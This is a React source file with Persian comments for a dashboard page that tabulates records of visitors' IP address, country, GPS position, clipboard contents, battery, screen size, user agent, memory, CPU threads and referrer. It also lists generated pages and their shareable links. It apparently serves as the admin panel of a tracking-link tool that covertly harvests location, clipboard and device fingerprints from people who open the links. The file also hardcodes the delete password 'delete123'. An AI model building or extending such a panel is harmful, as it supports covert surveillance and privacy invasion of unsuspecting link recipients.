import React, { useState, useMemo } from "react";
import { DashboardLayout } from "@/components/DashboardLayout";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { useFolderTextFiles } from "@/hooks/useFolderTextFiles";
import { useData } from "@/contexts/DataContext";
import { Table, TableHeader, TableBody, TableHead, TableRow, TableCell } from "@/components/ui/table";
import { Files, Eye, Trash2, Download, Link as LinkIcon } from "lucide-react";
import { useToast } from "@/components/ui/use-toast";
import { format } from "date-fns";
import { DeletePageDialog } from "@/components/DeletePageDialog";

// ستون‌های مشخص
const FIXED_LABELS = [
  "Ip Address", "Country", "NetworkInformation", "Batterypercentage",
  "Ischarging", "ScreenWidth", "ScreeHeight", "Platform", "GPS", "DeviceLocalTime",
  "DeviceLanguage", "CookieEnabled", "UserAgent", "DeviceMemory", "CPuThreads",
  "Clipboard", "ReferUrl"
];

export default function Database() {
  const { files, loading } = useFolderTextFiles();
  const [search, setSearch] = useState("");
  const [uploading, setUploading] = useState(false);
  const [uploadError, setUploadError] = useState<string | null>(null);
  const { toast } = useToast();

  // حذف پسوند از اسم فایل
  const getFileId = (fileName: string) =>
    fileName.replace(/\.[^.]+$/, "");

  // ردیف‌های فایل را آبجکت می‌کند
  const getRowObj = (rows: { label: string; value: string }[]) => {
    const obj: Record<string, string> = {};
    rows.forEach(({ label, value }) => {
      obj[label] = value;
    });
    return obj;
  };

  // سرچ روی همه محتویات جدول فایل‌ها و اسم فایل
  const filteredFiles = useMemo(() => {
    if (!search.trim()) return files;
    return files.filter(file => {
      const rowObj = getRowObj(file.rows);
      // سرچ روی همه فیلدها و مقادیر
      const values = [
        getFileId(file.fileName), // بدون پسوند
        file.fileName,
        ...FIXED_LABELS.map(label => rowObj[label] || ""),
        ...Object.values(rowObj),
      ];
      return values.some(val =>
        (val || "").toString().toLowerCase().includes(search.toLowerCase())
      );
    });
  }, [files, search]);

  const handleExport = (type: "csv" | "excel") => {
    const sep = type === "csv" ? "," : "\t";
    const header = ["ID", ...FIXED_LABELS];
    const rows = filteredFiles.map(file => {
      const rowObj = getRowObj(file.rows);
      return [
        getFileId(file.fileName),
        ...FIXED_LABELS.map(label => (rowObj[label] || "").replace(/[\r\n]+/g, " "))
      ].map(v => `"${v.replace(/"/g, '""')}"`).join(sep);
    });
    const content = [header.join(sep), ...rows].join("\r\n");
    const blob = new Blob([content], {
      type:
        type === "csv"
          ? "text/csv;charset=utf-8;"
          : "application/vnd.ms-excel"
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `database_export.${type === "csv" ? "csv" : "xls"}`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    toast({
      title: `Exported as ${type.toUpperCase()}`,
      description: "The table exported successfully.",
    });
  };

  // --- هندل آپلود ---
  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    setUploadError(null);
    const file = e.target.files?.[0];
    if (!file) return;

    if (!/\.txt$|\.html$/i.test(file.name)) {
      setUploadError("فقط فایل txt یا html مجاز است.");
      return;
    }

    setUploading(true);
    try {
      setTimeout(() => {
        toast({
          title: "آپلود دستی لازم است",
          description: "جهت ثبت فایل، فایل خود را در مسیر public/datafiles کپی کنید و صفحه را رفرش نمایید.",
          variant: "default",
        });
        setUploading(false);
        e.target.value = "";
      }, 500);
    } catch (err) {
      setUploadError("آپلود ناموفق: " + String(err));
      setUploading(false);
    }
  };

  const { pages, deletePage, getPageLinks } = useData();

  // حذف صفحه با dialog
  const handleDeletePage = (pageId: string) => (inputPassword: string) => {
    if (inputPassword !== "delete123") {
      toast({
        title: "رمز اشتباه است",
        description: "صفحه حذف نشد.",
        variant: "destructive",
      });
      return;
    }
    deletePage(pageId);
    toast({ title: "صفحه حذف شد" });
  };

  // دانلود html page
  const handleDownloadPage = (pageId: string) => {
    const page = pages.find(p => p.id === pageId);
    if (!page) return;
    const html = `<!DOCTYPE html>
<html>
<head>
  <title>${page.title}</title>
  <meta charset="utf-8">
</head>
<body>
  <h1>${page.title}</h1>
  <div>${page.content}</div>
</body>
</html>
`;
    const blob = new Blob([html], { type: "text/html" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `page-${pageId}.html`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  return (
    <DashboardLayout title="Database">
      <div className="max-w-7xl mx-auto py-10 space-y-6">
        {/* --- کنترل‌های بالا - جست‌وجو، اکسپورت، آپلود --- */}
        <Card>
          <CardHeader>
            <CardTitle>Text/HTML Files Database Table</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex flex-col lg:flex-row gap-4 lg:items-center justify-between mb-3 flex-wrap">
              <input
                className="border rounded-lg px-4 py-2 w-full lg:w-96"
                placeholder="Search record..."
                value={search}
                onChange={e => setSearch(e.target.value)}
              />
              <div className="flex flex-wrap gap-2 items-center">
                <Button onClick={() => handleExport("csv")} variant="outline">
                  <Files className="h-4 w-4 mr-2" /> Export CSV
                </Button>
                <Button onClick={() => handleExport("excel")} variant="outline">
                  <Files className="h-4 w-4 mr-2" /> Export Excel
                </Button>
                <div className="flex flex-col gap-1">
                  <label className="font-semibold text-xs mb-1">
                    آپلود فایل txt یا html
                  </label>
                  <input
                    type="file"
                    accept=".txt, .html"
                    onChange={handleFileUpload}
                    disabled={uploading}
                    className="block"
                    style={{ minWidth: "180px" }}
                  />
                </div>
                {uploading && <span className="text-sm">درحال آپلود...</span>}
                {uploadError && (
                  <span className="text-red-600 text-xs ml-2">{uploadError}</span>
                )}
              </div>
            </div>
            <div className="text-xs text-muted-foreground my-2">
              جهت ثبت فایل جدید فقط کافیست آن را در مسیر <code>/public/datafiles/</code> قرار دهید و صفحه را رفرش کنید.<br />
              نیازی به تغییر فایل json نیست!
            </div>
            <div className="overflow-x-auto rounded border bg-background">
              <table className="w-full min-w-max border-collapse">
                <thead className="bg-muted">
                  <tr>
                    <th className="px-4 py-2 whitespace-nowrap text-left font-semibold text-sm">
                      ID
                    </th>
                    {FIXED_LABELS.map(label => (
                      <th
                        key={label}
                        className="px-4 py-2 whitespace-nowrap text-left font-semibold text-sm"
                      >
                        {label}
                      </th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {loading ? (
                    <tr>
                      <td colSpan={FIXED_LABELS.length + 1} className="text-center py-8">
                        خواندن فایل‌ها...
                      </td>
                    </tr>
                  ) : filteredFiles.length === 0 ? (
                    <tr>
                      <td colSpan={FIXED_LABELS.length + 1} className="text-center py-8">
                        هیچ فایل متنی پیدا نشد.
                      </td>
                    </tr>
                  ) : (
                    filteredFiles.map(file => {
                      const rowObj = getRowObj(file.rows);
                      return (
                        <tr key={file.fileName} className="border-b last:border-b-0">
                          {/* حذف پسوند از ID */}
                          <td className="px-4 py-2 font-mono text-sm whitespace-nowrap">
                            {getFileId(file.fileName)}
                          </td>
                          {FIXED_LABELS.map(label => (
                            <td key={label} className="px-4 py-2 text-xs whitespace-pre-wrap break-all">
                              {rowObj[label] || ""}
                            </td>
                          ))}
                        </tr>
                      );
                    })
                  )}
                </tbody>
              </table>
            </div>
          </CardContent>
        </Card>

        {/* ---- صفحه‌ها + لینک‌ها ---- */}
        <Card>
          <CardHeader>
            <CardTitle>Pages</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto rounded border bg-background">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Title</TableHead>
                    <TableHead>Created</TableHead>
                    <TableHead>Links</TableHead>
                    <TableHead>Actions</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {pages.length === 0 ? (
                    <TableRow>
                      <TableCell colSpan={4} className="text-center text-sm">
                        هیچ صفحه‌ای نیست.
                      </TableCell>
                    </TableRow>
                  ) : (
                    pages.map(page => (
                      <TableRow key={page.id}>
                        <TableCell>{page.title}</TableCell>
                        <TableCell>{format(new Date(page.createdAt), "PPP")}</TableCell>
                        {/* ستونی برای نمایش لینک‌های ساخته شده برای صفحه */}
                        <TableCell>
                          {getPageLinks(page.id).length === 0 ? (
                            <span className="text-muted-foreground text-xs">بدون لینک</span>
                          ) : (
                            <div className="flex flex-col gap-1">
                              {getPageLinks(page.id).map(link => (
                                <span
                                  key={link.id}
                                  className="flex items-center gap-1 text-xs"
                                >
                                  <LinkIcon className="w-4 h-4" />
                                  <a
                                    href={link.fullLink}
                                    className="text-blue-600 underline"
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    title="Open link"
                                  >
                                    {link.fullLink}
                                  </a>
                                  <Button
                                    variant="secondary"
                                    size="icon"
                                    className="p-1"
                                    onClick={() => {
                                      navigator.clipboard.writeText(link.fullLink);
                                      toast({
                                        title: "Copied!",
                                        description: "لینک در کلیپ‌بورد کپی شد.",
                                      });
                                    }}
                                  >
                                    <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15V5a2 2 0 012-2h10"></path></svg>
                                  </Button>
                                </span>
                              ))}
                            </div>
                          )}
                        </TableCell>
                        <TableCell>
                          <div className="flex gap-2">
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() =>
                                window.open(`/preview/${page.id}`, "_blank")
                              }
                              title="View"
                            >
                              <Eye className="h-4 w-4" />
                            </Button>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => handleDownloadPage(page.id)}
                              title="Download"
                            >
                              <Download className="h-4 w-4" />
                            </Button>
                            {/* استفاده از دیالوگ مدرن حذف */}
                            <DeletePageDialog
                              onDelete={handleDeletePage(page.id)}
                              trigger={
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  title="Delete"
                                >
                                  <Trash2 className="h-4 w-4 text-destructive" />
                                </Button>
                              }
                            />
                          </div>
                        </TableCell>
                      </TableRow>
                    ))
                  )}
                </TableBody>
              </Table>
            </div>
          </CardContent>
        </Card>
      </div>
    </DashboardLayout>
  );
}
